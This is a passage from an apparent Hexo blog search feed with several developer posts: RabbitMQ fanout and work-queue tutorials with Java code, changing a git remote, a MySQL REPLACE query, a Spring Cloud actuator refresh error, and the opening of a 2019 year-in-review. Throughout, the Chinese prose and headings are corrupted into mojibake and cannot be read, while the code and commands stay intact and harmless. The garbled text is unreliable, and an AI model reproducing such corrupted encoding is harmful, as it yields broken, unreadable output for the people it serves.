        <content type="html"><![CDATA[<h3 id="ÂèëÂ∏É‰∏éËÆ¢ÈòÖ"><a href="#ÂèëÂ∏É‰∏éËÆ¢ÈòÖ" class="headerlink" title="ÂèëÂ∏É‰∏éËÆ¢ÈòÖ"></a>ÂèëÂ∏É‰∏éËÆ¢ÈòÖ</h3><p>Âú®‰∏ä‰∏Ä‰∏™ÊïôÁ®ã‰∏≠ÔºåÊàë‰ª¨ÂàõÂª∫‰∏Ä‰∏™Â∑•‰ΩúÈòüÂàóÔºåÊàë‰ª¨Â∞ÜÊØè‰∏™‰∫∫Áâ©ÔºåÊúÄÁªàÊÅ∞Â•ΩÂàÜÈÖçÂà∞‰∏Ä‰∏™Â∑•‰∫∫„ÄÇÁÑ∂ËÄåÔºåÂú®Ëøô‰∏™ÈÉ®ÂàÜÔºåÊàë‰ª¨Â∏åÊúõÊØè‰∏™Ê∂àÊÅØËÉΩÂàÜÈÖçÁªôÂ§ö‰∏™Ê∂àË¥πËÄÖ„ÄÇËøôÁßçÂè´ÂèëÂ∏ÉËÆ¢ÈòÖÊ®°Âºè„ÄÇ‰∏æ‰æãÔºåÊ≥®ÂÜåÊó∂ÈúÄË¶ÅÂêåÊó∂ÂèëÈÄÅÁü≠‰ø°ÂíåÂèëÈÄÅemail,Êàë‰ª¨‰ºöÂ∞ÜÁî®Êà∑Ê≥®ÂÜåÁöÑ‰ø°ÊÅØÂèëÁªô‰∏§‰∏™Ê∂àË¥πËÄÖÔºå‰∏Ä‰∏™‰∏ìÈó®ÂèëÈÄÅÁü≠‰ø°Ê∂àË¥πËÄÖÔºå‰∏Ä‰∏™‰∏ìÈó®ÂèëÈÄÅemailÊ∂àË¥πËÄÖ„ÄÇ</p><p>RabbitMQÊ∂àÊÅØ‰º†ÈÄíÊ®°ÂûãÁöÑÊ†∏ÂøÉÊÄùÊÉ≥ÊòØÔºåÁîü‰∫ßËÄÖ‰∏çÁõ¥Êé•ÊÉ≥Ê∂àÊÅØÈòüÂàóÂèëÈÄÅ‰ø°ÊÅØ„ÄÇÂÆûÈôÖ‰∏äÔºåÁîü‰∫ßËÄÖÂπ∂‰∏çÁü•ÈÅìÊ∂àÊÅØÊòØÂê¶‰ºöË¢´‰º†ÈÄíÂà∞‰ªª‰ΩïÈòüÂàó‰∏ä„ÄÇ</p><h4 id="‰∫§Êç¢Êú∫"><a href="#‰∫§Êç¢Êú∫" class="headerlink" title="‰∫§Êç¢Êú∫"></a>‰∫§Êç¢Êú∫</h4><p>ËøôÈáåÂ∞±ËÆ≤Âà∞‰∏Ä‰∏™Êñ∞ÂûãÊ¶ÇÂøµÔºå‰∫§Êç¢Êú∫ÔºàexchangeÔºâ,‰∏ÄÊñπÈù¢Êé•Êî∂Áîü‰∫ßËÄÖÁöÑ‰ø°ÊÅØÔºå‰∏ÄÊñπÈù¢Êé®ÈÄÅÁªôÈòüÂàó„ÄÇ‰∫§Êç¢Âô®ÂøÖÈ°ªÁ°ÆÂàáÂú∞Áü•ÈÅìÂ¶Ç‰ΩïÂ§ÑÁêÜÂÆÉÊé•Êî∂Âà∞ÁöÑÊ∂àÊÅØ„ÄÇÂÆÉÂ∫îËØ•Ë¢´ÈôÑÂä†Âà∞‰∏Ä‰∏™ÁâπÂÆöÁöÑÈòüÂàóÂêó?ÂÆÉÂ∫îËØ•Ë¢´Ê∑ªÂä†Âà∞ËÆ∏Â§öÈòüÂàó‰∏≠Âêó?ÊàñËÄÖÂÆÉÂ∫îËØ•Ë¢´‰∏¢ÂºÉ„ÄÇËøô‰∫õËßÑÂàôÁî±exchangeÁ±ªÂûãÂÆö‰πâ„ÄÇÊúâÂá†ÁßçÂèØÁî®ÁöÑ‰∫§Êç¢Á±ªÂûã:direct„ÄÅtopic„ÄÅheadersÂíåfanout„ÄÇ‰∏ãÈù¢ËÆ≤ÔºöfanoutÔºåÊòØ‰∏Ä‰∏™ÊØîËæÉÁÆÄÂçïÁöÑÁ±ªÂûã„ÄÇÂè™ÊòØÂ∞ÜÊ∂àÊÅØÂπøÊí≠Âà∞ÂÆÉÁü•ÈÅìÁöÑÊâÄÊúâÈòüÂàó‰∏≠Âéª„ÄÇ‰∏ãÂõæ‰∏≠XÂ∞±ÊòØ‰∫§Êç¢Êú∫„ÄÇ</p><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373846.2605274567.png" alt="exchangeÊ®°ÂûãÂõæ"></p><h3 id="Áîü‰∫ßËÄÖ"><a href="#Áîü‰∫ßËÄÖ" class="headerlink" title="Áîü‰∫ßËÄÖ"></a>Áîü‰∫ßËÄÖ</h3><pre><code>public class Send {    private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        Connection connection = ConnectionUtils.getConnection() ;        Channel channel = connection.createChannel();        // Â£∞ÊòéÈòüÂàó        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT);//ÂàÜÂèëÁ±ªÂûãfanout        String msg = &quot;hello world ps&quot;;        // ÂèëÈÄÅ‰ø°ÊÅØ        channel.basicPublish(EXCHANGE_NAME,&quot;&quot;,null,msg.getBytes());        System.out.println(&quot;send success&quot;);        // ÂÖ≥Èó≠ÊµÅ        channel.close();        connection.close();    }}</code></pre><h4 id="Ê∂àË¥πËÄÖ"><a href="#Ê∂àË¥πËÄÖ" class="headerlink" title="Ê∂àË¥πËÄÖ"></a>Ê∂àË¥πËÄÖ</h4><pre><code>public class Rece1 {    private final static String QUEUE_NAME = &quot;test_queu_email&quot;;    private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        Connection connection = ConnectionUtils.getConnection();        Channel channel = connection.createChannel();        // ÁªëÂÆöÈòüÂàó        channel.queueDeclare(QUEUE_NAME, false, false, false, null);        // ÁªëÂÆöÈòüÂàóÂà∞‰∫§Êç¢Êú∫‰∏ä        channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, &quot;&quot;);        //qos=1        channel.basicQos(1);        DefaultConsumer consumer = new DefaultConsumer(channel) {            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {                System.out.println(&quot;send email &quot; + new String(body, Charset.defaultCharset()));                channel.basicAck(envelope.getDeliveryTag(), false);            }        };        boolean autoAck = false;        channel.basicConsume(QUEUE_NAME, autoAck, consumer);    }}public class Rece2 {    private final static String QUEUE_NAME = &quot;test_queu_msg&quot;;    private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        Connection connection = ConnectionUtils.getConnection();        Channel channel = connection.createChannel();        // ÁªëÂÆöÈòüÂàó        channel.queueDeclare(QUEUE_NAME, false, false, false, null);        // ÁªëÂÆöÈòüÂàóÂà∞‰∫§Êç¢Êú∫‰∏ä        channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, &quot;&quot;);        //qos=1        channel.basicQos(1);        DefaultConsumer consumer = new DefaultConsumer(channel) {            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {                System.out.println(&quot;send msg &quot; + new String(body, Charset.defaultCharset()));                channel.basicAck(envelope.getDeliveryTag(), false);            }        };        boolean autoAck = false;        channel.basicConsume(QUEUE_NAME, autoAck, consumer);    }}</code></pre><h4 id="ÂÆòÊñπÊé®ËçêÁöÑqueue-name"><a href="#ÂÆòÊñπÊé®ËçêÁöÑqueue-name" class="headerlink" title="ÂÆòÊñπÊé®ËçêÁöÑqueue_name"></a>ÂÆòÊñπÊé®ËçêÁöÑqueue_name</h4><p>ÂÆòÊñπÂ∏åÊúõËÉΩÂ§üÂÆûÁé∞ÔºåÁîüÊàêÂîØ‰∏ÄÂêçÁß∞queue_name,Âπ∂‰∏î‰∏ÄÊó¶Êñ≠ÂºÄÁîü‰∫ßËÄÖËøûÊé•ÔºåÈòüÂàóËá™Âä®Âà†Èô§„ÄÇ</p><pre><code>String queueName = channel.queueDeclare().getQueue();</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ-Â∑•‰ΩúÈòüÂàó</title>
      <link href="/2020/02/29/RabbitMQ-%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97/"/>
      <url>/2020/02/29/RabbitMQ-%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="‰ªãÁªç"><a href="#‰ªãÁªç" class="headerlink" title="‰ªãÁªç"></a>‰ªãÁªç</h3><p>RabbitMQÊòØÊ∂àÊÅØ‰ª£ÁêÜ„ÄÇÂÆÉÊé•Êî∂‰ø°ÊÅØÂíåËΩ¨Âèë‰ø°ÊÅØ„ÄÇ‰Ω†ÂèØ‰ª•Êää‰ªñËÄÉËôëÊàê‰∏Ä‰∏™ÈÇÆÂ±Ä„ÄÇÂΩì‰Ω†ËÆ≤ÈÇÆÂØÑÁöÑ‰ø°ÊîæÂú®ÈÇÆÂ±ÄÊó∂Ôºå‰Ω†ÂèØ‰ª•Á°ÆÂÆöÈÇÆÂ∑ÆÂÖàÁîüÊàñËÄÖÂ•≥Â£´‰ºöÊääÈÇÆ‰ª∂ÊúÄÁªàÈÄÅÂà∞‰Ω†ÁöÑÊî∂‰ª∂‰∫∫Êâã‰∏≠„ÄÇÂΩìÁÑ∂ÈÇÆÂ±ÄÂíåRabbitMQÊúÄÂ§ßÁöÑÂå∫Âà´ÔºåRabbitMq‰∏çÊé•ÂèóÁ∫∏Âº†ÔºåÂÆÉÂè™Êé•Êî∂ÔºåÂ≠òÂÇ®ÔºåËΩ¨Âèë‰∫åËøõÂà∂ÁöÑÊï∞ÊçÆÊ∂àÊÅØÂø´„ÄÇ</p><p>‰∏ãÈù¢ËÆ≤‰∏Ä‰∫õRabbitMQ‰∏≠ÁöÑÊúØËØ≠Ôºö</p><ul><li>Producer </li></ul><p>ÁîüÊàêÂè™‰∏çËøáÊÑèÂë≥ÁùÄÂèëÈÄÅ‰ø°ÊÅØ„ÄÇÂèëÈÄÅ‰ø°ÊÅØÁöÑÁ®ãÂ∫èÊòØÁîü‰∫ßËÄÖ</p><ul><li>Queue </li></ul><p>ÈòüÂàóÊòØÈ©ªÁïôÂú®RabbitMQÂÜÖÁöÑÈÇÆÁÆ±ÁöÑÂêçÁß∞„ÄÇÂ∞ΩÁÆ°Ê∂àÊÅØflow<br>RabbitMQÂíå‰Ω†ÁöÑÁ®ãÂ∫èÔºå‰ΩÜÊòØ‰ªñ‰ª¨Âè™ËÉΩÂ≠òÂÇ®Âú®ÈòüÂàó‰∏≠„ÄÇ‰∏Ä‰∏™ÈòüÂàóÂè™Âèó‰∏ªÊú∫ÁöÑÂÜÖÂ≠òÂíåÁ£ÅÁõòÈôêÂà∂ÔºåÂÆÉÁöÑÊú¨Ë¥®ÊòØ‰∏Ä‰∏™Â§ßÁöÑÊ∂àÊÅØÁºìÂÜ≤Âå∫„ÄÇËÆ∏Â§öÊ∂àË¥πËÄÖÂèØ‰ª•Â∞ÜÊ∂àÊÅØÂèëÈÄÅÂà∞‰∏Ä‰∏™ÈòüÂàóÔºåËÆ∏Â§öÊ∂àË¥πËÄÖÂèØ‰ª•Â∞ùËØï‰ªé‰∏Ä‰∏™ÈòüÂàóÊé•Êî∂Êï∞ÊçÆÔºåËøôÂ∞±Êàë‰ª¨Ë°®Á§∫ÈòüÂàóÁöÑÊñπÂºè„ÄÇ</p><ul><li>Consumer </li></ul><p>Ê∂àË¥πÂíåÊé•Êî∂ÊúâÁõ∏ÂêåÁöÑÊÑè‰πâ„ÄÇÊ∂àË¥πËÄÖÊòØ‰∏Ä‰∏™‰∏ªË¶ÅÊé•Êî∂Ê∂àÊÅØÁöÑÁ®ãÂ∫è</p><p>Ê≥®ÊÑèÔºöÁîü‰∫ßËÄÖ„ÄÅÊ∂àË¥πËÄÖÂíå‰ª£ÁêÜ‰∏çÂøÖÈÉΩÂú®Âêå‰∏Ä‰∏ªÊú∫‰∏äÔºõÂÆûÈôÖ‰∏äÔºåÂú®Â§ßÂ§öÊï∞Â∫îÁî®Á®ãÂ∫è‰∏≠ÔºåÂÆÉ‰ª¨Âπ∂Ê≤°ÊúâËøôÊ†∑ÂÅö„ÄÇÂ∫îÁî®Á®ãÂ∫èÊó¢ÂèØ‰ª•ÊòØÁîüÊàêËÄÖ‰πüÂèØ‰ª•ÊòØÊ∂àË¥πËÄÖ„ÄÇ</p><h3 id="ÁÆÄÂçïÈòüÂàó"><a href="#ÁÆÄÂçïÈòüÂàó" class="headerlink" title="ÁÆÄÂçïÈòüÂàó"></a>ÁÆÄÂçïÈòüÂàó</h3><p>ÁÆÄÂçïÈòüÂàóÔºåÂ∞±ÊòØÂèëÈÄÅÂçï‰∏™Ê∂àÊÅØÁöÑÊ∂àË¥πËÄÖÂíåÊé•Êî∂‰ø°ÊÅØÂπ∂Â∞ÜÂÖ∂ÊâìÂç∞Âá∫Êù•ÁöÑ‰ΩøÁî®ËÄÖÔºàÊ∂àË¥πËÄÖÔºâÔºå‰∏çÂ§öÂèôËø∞„ÄÇ</p><h3 id="Â∑•‰ΩúÈòüÂàó"><a href="#Â∑•‰ΩúÈòüÂàó" class="headerlink" title="Â∑•‰ΩúÈòüÂàó"></a>Â∑•‰ΩúÈòüÂàó</h3><p>Â∑•‰ΩúÈòüÂàó‰∏ªË¶ÅÊòØÈÅøÂÖçÁü≠Êó∂Èó¥ÂÜÖÊâßË°åÂØÜÈõÜ‰ªªÂä°ÔºåÂπ∂‰∏îÂøÖÈ°ªÁ≠âÂæÖÂÆÉÂÆåÊàê„ÄÇÊàë‰ª¨Â∞Ü‰ªªÂä°ÊîæÂú®Ê∂àÊÅØÈòüÂàó‰∏≠ÔºåÂêØÂä®Â§ö‰∏™Ê∂àË¥πËÄÖÔºå‰ªªÂä°Âú®‰ªñ‰ª¨‰∏≠ÊòØÂÖ±‰∫´ÁöÑ„ÄÇ</p><p>ËÆæËÆ°Âà∞Â∑•‰ΩúÈòüÂàóÔºåÂΩìÁÑ∂‰ºöÊúâ‰∏çÂêåÊñπÂºèÁöÑÂ∑•‰ΩúÈòüÂàó</p><h4 id="ack"><a href="#ack" class="headerlink" title="ack"></a>ack</h4><p>ÂÖ≥‰∫é <code>ack</code> ËøôËæπÂ§öËÆ≤‰∏ÄÁÇπÔºå <code>message acknowledgment</code> ÊòØÊ∂àÊÅØÁ°ÆËÆ§ÔºåËÆæÁΩÆ <code>autoack=true</code><br>‰πãÂêéÔºåconsumerËøîÂõû‰∏Ä‰∏™ackÔºànowledgementÔºâ,ÂëäËØâ <code>rabbitMQ</code> Â∑≤ÁªèÊé•Âèó‰ø°ÊÅØÔºåÂ§ÑÁêÜ‰∫ÜÁâπÂÆöÁöÑÊ∂àÊÅØÔºå <code>RabbitMQ</code><br>ÂèØ‰ª•Ëá™Áî±Âú∞Âà†Èô§ÂÆÉ„ÄÇ</p><h4 id="ËΩÆËØ¢ÈòüÂàóÔºàRound-robin-dispatchingÔºâ"><a href="#ËΩÆËØ¢ÈòüÂàóÔºàRound-robin-dispatchingÔºâ" class="headerlink" title="ËΩÆËØ¢ÈòüÂàóÔºàRound-robin dispatchingÔºâ"></a>ËΩÆËØ¢ÈòüÂàóÔºàRound-robin dispatchingÔºâ</h4><p>Â∞Ü <code>autoAck</code> ËÆæÁΩÆ‰∏∫ <code>true</code><br>,ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåRabbitMQ‰ºöÂèëÈÄÅÊØèÊù°‰ø°ÊÅØÁªôÂè¶‰∏Ä‰∏™Ê∂àË¥πËÄÖ„ÄÇÊØè‰∏™Ê∂àË¥πËÄÖÈÉΩ‰ºöËé∑ÂèñÁõ∏ÂêåÊï∞ÈáèÁöÑ„ÄÇÂπ∂‰∏îÊòØÈó¥ÈöîÂΩ¢ÂºèÁöÑ„ÄÇÂ¶ÇÊúâc1,c2Ê∂àË¥πËÄÖÔºå10Êù°Ê∂àÊÅØÔºåc1ÊòØ0,2,4,6,8Ôºåc2ÊòØ1,3,5,7,9„ÄÇÂΩìÁÑ∂ÔºåÂú®ÊàëÊâìÊñ≠ÁÇπÊó∂ÔºåÂèëÁé∞ÂØπÂ∫îÁöÑÊï∞ÊçÆ‰ºöÈÉΩ‰∏ÄÊ¨°ÊÄßÂèëÈÄÅÂà∞c1ÔºåÂíåc2Ôºåc1Âíåc2Â§ÑÁêÜ‰ø°ÊÅØÊó∂ÔºåÂπ∂‰∏çÂΩ±ÂìçÂΩºÊ≠§„ÄÇ</p><h4 id="ÂÖ¨Âπ≥ÈòüÂàó"><a href="#ÂÖ¨Âπ≥ÈòüÂàó" class="headerlink" title="ÂÖ¨Âπ≥ÈòüÂàó"></a>ÂÖ¨Âπ≥ÈòüÂàó</h4><p>Âú® <code>RabbitMQ</code> ÂàÜÂèë‰ø°ÊÅØÁöÑÊó∂ÂÄôÔºåÂèØËÉΩ‰ºöÂèëÁé∞Ôºå‰∏Ä‰∏™consumerÂæàÂøôÔºåÂè¶‰∏Ä‰∏™‰∏ÄÁÇπ‰πü‰∏çÂøô„ÄÇÂõ†‰∏∫ <code>RabbitMQ</code><br>ÂØπÊ≠§‰∏ÄÊó†ÊâÄÁü•ÔºåÂè™ÊòØÂ∞ÜÁ¨¨NÊù°‰ø°ÊÅØÔºåÂèëÈÄÅÁªôÁ¨¨Nconsumer.</p><p>‰∏∫‰∫ÜËß£ÂÜ≥Ëøô‰∏™ÔºåÊàë‰ª¨Â∞ÜbasicQosÊñπÊ≥ïÂíåprefetechCount=1ËÆæÁΩÆ‰∏ÄËµ∑Áî®„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂú®Â§ÑÁêÜÂπ∂Á°ÆËÆ§‰∏ä‰∏ÄÊù°‰ø°ÊÅØ‰πãÂâçÔºå‰∏çË¶ÅÂ∞ÜÊñ∞‰ø°ÊÅØÂèëÈÄÅÁªôÂ∑•‰∫∫„ÄÇ</p><pre><code>int prefetchCount = 1;channel.basicQos(prefetchCount);</code></pre><p>Âπ∂‰∏îÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜautoAckËÆæ‰∏∫falseÂíåÂ§ÑÁêÜÂÆå‰∏ÄÊù°Ê∂àÊÅØÂêéÂèëÈÄÅackÁªô <code>RabbitMQ</code></p><pre><code>DefaultConsumer defaultConsumer = new DefaultConsumer(channel){            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {                String msg = new String(body, &quot;utf-8&quot;);                System.out.println(&quot;receive1 : &quot; + msg);                try {                    Thread.sleep(2000);                } catch (InterruptedException e) {                    e.printStackTrace();                }finally {                    channel.basicAck(envelope.getDeliveryTag(),false);                }            }        };        boolean autoack = false;        channel.basicConsume(QUEUE_NAME,autoack,defaultConsumer);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> erlang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git‰øÆÊîπËøúÁ®ã‰ªìÂ∫ì</title>
      <link href="/2020/02/10/git%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/"/>
      <url>/2020/02/10/git%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h3 id="Ëµ∑Âõ†"><a href="#Ëµ∑Âõ†" class="headerlink" title="Ëµ∑Âõ†"></a>Ëµ∑Âõ†</h3><p>ÂÖ¨Âè∏Áî®ÁöÑÊâòÁÆ°‰ªìÂ∫ìÊòØcodingÔºåÁÑ∂Âêé‰ªäÂ§©‰ªìÂ∫ìÂú∞ÂùÄÊç¢‰∫ÜÔºåÊõ¥Êñ∞È°πÁõÆÊó∂ÔºåÊèêÁ§∫Êä•ÈîôÔºåÈÅÇÊõ¥Êñ∞ËøúÁ®ã‰ªìÂ∫ì</p><pre><code>Coding ÊèêÁ§∫: Public key expired.Ê≠§ÂÖ¨Èí•Â∑≤ÁªèË∂ÖËøáÊúâÊïàÊúüÔºåË¶ÅÁªßÁª≠‰ΩøÁî®ËØ∑Âà∞ https://coding.net/user/account/setting/keys Êõ¥ÊîπËÆæÁΩÆ„ÄÇfatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists.</code></pre><h3 id="Ëß£ÂÜ≥ÊñπÊ°à"><a href="#Ëß£ÂÜ≥ÊñπÊ°à" class="headerlink" title="Ëß£ÂÜ≥ÊñπÊ°à"></a>Ëß£ÂÜ≥ÊñπÊ°à</h3><p>ÂÖàÊõ¥Êñ∞‰∫Ü‰∏Ä‰∏ãÈ°πÁõÆ‰∏≠ssh keyÁöÑÊúâÊïàÊúüÔºåÊàëÂ∞±ËÆæÁΩÆÊàê‰∫ÜÊ∞∏‰πÖÊúâÊïà</p><p>ÁÑ∂Âêé‰øÆÊîπËøúÁ®ã‰ªìÂ∫ìÂú∞ÂùÄ</p><pre><code># Âà†Èô§ÂΩìÂâçËøúÁ®ã‰ªìÂ∫ìÂú∞ÂùÄgit remote rm origin# Ê∑ªÂä†ËøúÁ®ã‰ªìÂ∫ìgit remote add origin [url]# ËÆ©Êú¨Âú∞ËÉΩÂ§üËØªÂèñËøúÁ®ãÁöÑÂàÜÊîØÔºå‰ª•‰æøÂêéÁª≠trackgit fetch# Êú¨Âú∞ËøΩË∏™ËøúÁ®ãgit branch --set-upstream-to=origin/master master</code></pre><p>Ê†πÊçÆ‰ª•‰∏äÊìç‰ΩúÔºåÂ∫îËØ•Â∞±‰ºöÂ•Ω‰∫Ü</p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql replace</title>
      <link href="/2020/01/18/sql%20replace/"/>
      <url>/2020/01/18/sql%20replace/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlÊõøÊç¢"><a href="#sqlÊõøÊç¢" class="headerlink" title="sqlÊõøÊç¢"></a>sqlÊõøÊç¢</h2><h3 id="Ëµ∑Âõ†"><a href="#Ëµ∑Âõ†" class="headerlink" title="Ëµ∑Âõ†"></a>Ëµ∑Âõ†</h3><p>‰∏ÉÁâõ‰∫ë‰∏ä‰º†ÂõæÁâáÁöÑËøîÂõûÊó∂ÔºåÂâçÁ´ØÊãºÊé•‰∫ÜÂüüÂêçÔºåÂØºËá¥ÂõæÁâá‰øùÂ≠òÊó∂ÔºåÊòØÂÖ®ÂüüÂêçÔºå‰æãÂ¶Ç</p><p><code>http://example.com/a.jpg</code> Âá∫Áé∞‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂüüÂêçÂø´Ë¶ÅÂà∞Êúü‰∫ÜÔºåÈúÄË¶ÅÊõ¥Êç¢ÂüüÂêçÔºåÊï∞ÊçÆÂ∫ì‰∏≠‰øùÂ≠òÁöÑÊï∞ÊçÆÈúÄË¶ÅÊõ¥Êç¢ÊàêÊñ∞ÁöÑÂüüÂêç</p><h3 id="ÊâæÂà∞ÁöÑÁ≠îÊ°à"><a href="#ÊâæÂà∞ÁöÑÁ≠îÊ°à" class="headerlink" title="ÊâæÂà∞ÁöÑÁ≠îÊ°à"></a>ÊâæÂà∞ÁöÑÁ≠îÊ°à</h3><pre><code>UPDATE your_tableSET your_field = REPLACE(your_field, &apos;articles/updates/&apos;, &apos;articles/news/&apos;)WHERE your_field LIKE &apos;%articles/updates/%&apos;</code></pre><p><a href="https://stackoverflow.com/a/14586441/7188357" target="_blank" rel="noopener"> Á≠îÊ°àÂú∞ÂùÄ </a></p><h3 id="ÂÆûÈôÖÂ∫îÁî®"><a href="#ÂÆûÈôÖÂ∫îÁî®" class="headerlink" title="ÂÆûÈôÖÂ∫îÁî®"></a>ÂÆûÈôÖÂ∫îÁî®</h3><pre><code>UPDATE bannerSET img_url = REPLACE(img_url, &apos;http://example.com&apos;, &apos;http://google.com&apos;)WHERE img_url like &apos;http://example.com%&apos;;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springcloud‰∏≠ÁªìÂêàactuator‰∏çÊîØÊåÅ_actuator_refresh</title>
      <link href="/2020/01/17/springcloud%E4%B8%AD%E7%BB%93%E5%90%88actuator%E4%B8%8D%E6%94%AF%E6%8C%81_actuator_refresh/"/>
      <url>/2020/01/17/springcloud%E4%B8%AD%E7%BB%93%E5%90%88actuator%E4%B8%8D%E6%94%AF%E6%8C%81_actuator_refresh/</url>
      
        <content type="html"><![CDATA[<h2 id="Ëµ∑Âõ†"><a href="#Ëµ∑Âõ†" class="headerlink" title="Ëµ∑Âõ†"></a>Ëµ∑Âõ†</h2><p>Âõ†‰∏∫springcloud config ÈáåÈù¢ÈúÄË¶ÅËé∑ÂèñÂà∑Êñ∞ÈÖçÁΩÆÊó∂ÔºåÂú®ËÆøÈóÆÊµèËßàÂô® <code>http://localhost:13000/actuator/refresh</code> Êó∂ÔºåÂèëÁé∞Âá∫Èîô„ÄÇ</p><h2 id="ÊéíÊü•"><a href="#ÊéíÊü•" class="headerlink" title="ÊéíÊü•"></a>ÊéíÊü•</h2><pre><code>Whitelabel Error PageThis application has no configured error view, so you are seeing this as a fallback.Fri Jan 17 10:40:30 CST 2020[2d29c4d7] There was an unexpected error (type=Method Not Allowed, status=405).Request method &apos;GET&apos; not supported</code></pre><p>ÊµèËßàÂô®Êä•ÈîôÔºåÂá∫Áé∞ <code>Request method &#39;GET&#39; not supported</code> ,‰∏çÊîØÊåÅ <code>GET</code><br>ËØ∑Ê±ÇÔºåÂèØÊÉúÔºåÊàëÁ¨¨‰∏ÄÊ¨°Âá∫ÈîôÁöÑÊó∂ÂÄôÔºåÊ≤°Êúâ‰ªîÁªÜÁúãÊä•Èîô‰ø°ÊÅØ„ÄÇ</p><h2 id="Ëµ∞ÂºØË∑Ø"><a href="#Ëµ∞ÂºØË∑Ø" class="headerlink" title="Ëµ∞ÂºØË∑Ø"></a>Ëµ∞ÂºØË∑Ø</h2><p>È¶ñÂÖàÔºåÊàëÊîæÂºÄ‰∫Ü <code>actuator</code> ÁöÑÊâÄÊúâË∑ØÂæÑ</p><pre><code>management:  endpoints:    web:      exposure:        include: &quot;*&quot;</code></pre><p>ÂÜçËÆøÈóÆ <code>localhost:13000/actuator</code> ÂèØ‰ª•ÁúãÂà∞ÔºåÈáåÈù¢Êúârefresh</p><pre><code>&quot;refresh&quot;: {      &quot;href&quot;: &quot;http://localhost:13000/actuator/refresh&quot;,      &quot;templated&quot;: false    }</code></pre><p>ÂêéÊù•ÂèàÂú®github‰∏äÊâæÂà∞‰∫ÜÁõ∏‰ººÁöÑÈóÆÈ¢ò</p><p><code>https://github.com/spring-projects/spring-boot/issues/10829</code></p><p>ÈáåÈù¢ÊèêÂà∞‰∫Ü <code>/actuator/refresh</code> ‰∏çÊîØÊåÅ <code>GET</code> ,ÊîØÊåÅ <code>POST</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019Âπ¥Âπ¥Â∫¶ÊÄªÁªì</title>
      <link href="/2019/12/18/2019%E5%B9%B4%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2019/12/18/2019%E5%B9%B4%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="‰ªäÂπ¥Â§ßËá¥ÂÅö‰∫Ü‰ªÄ‰πà"><a href="#‰ªäÂπ¥Â§ßËá¥ÂÅö‰∫Ü‰ªÄ‰πà" class="headerlink" title="‰ªäÂπ¥Â§ßËá¥ÂÅö‰∫Ü‰ªÄ‰πà"></a>‰ªäÂπ¥Â§ßËá¥ÂÅö‰∫Ü‰ªÄ‰πà</h3><h4 id="2018-12-2019-02"><a href="#2018-12-2019-02" class="headerlink" title="2018.12-2019.02"></a>2018.12-2019.02</h4><p>ËøôÊÆµÊó∂Èó¥Âú®‰∏äÊµ∑‰∏ÄÂÆ∂20‰∏™‰∫∫ÁöÑÊ∏∏ÊàèÂÖ¨Âè∏ÔºåÊó©‰∏äÂêÉÁΩóÊ£ÆÁöÑÂåÖÂ≠êÔºåÂñùË±ÜÊµÜÔºåÂèÇ‰∏é‰∫ÜÁ∫¢ÂåÖÈ°πÁõÆ„ÄÇÂÖ¨Âè∏Êû∂ÊûÑÊòØÂêéÁ´Øspringboot+Netty,ÂâçÁ´ØUnity3D.Â∑•‰ΩúÂà∞2ÊúàÂ∫ï„ÄÇÂç∞Ë±°ÊØîËæÉÊ∑±ÁöÑÊòØÔºåÂÖ¨Âè∏ÊúâÂè™ÂÖîÂ≠êÔºåÊØèÂ§©Â∞±ÊòØÂêÉÂêÉÔºåËÄå‰∏îÁ¶ªÊàë‰ª¨ËøëÔºåÂ•ΩËá≠ÔºåÊúâÂá†Ê¨°ÔºåÂë®Êú´Ê≤°‰∫∫Âú®ÔºåÂÖîÂ≠êÁ´üÁÑ∂Â∞±Ê≤°ÂêÉÔºåÊòüÊúü‰∏ÄÂéªÁöÑÊó∂ÂÄôÔºåÂÖîÂ≠êÂíåÁñØÂ≠ê‰∏ÄÊ†∑ÔºåÊúÄÂêé‰πü‰∏çÁü•ÈÅìÔºåÂÖîÂ≠êÊúâÊ≤°ÊúâÊàêÁ∫¢ÁÉßÂÖîÂ≠ê„ÄÇÂ≠¶Ê†°ËÆ©ÂõûÂéªÊØï‰∏öËÆæËÆ°Ôºå‰∫éÊòØÁ¶ªËÅå„ÄÇ<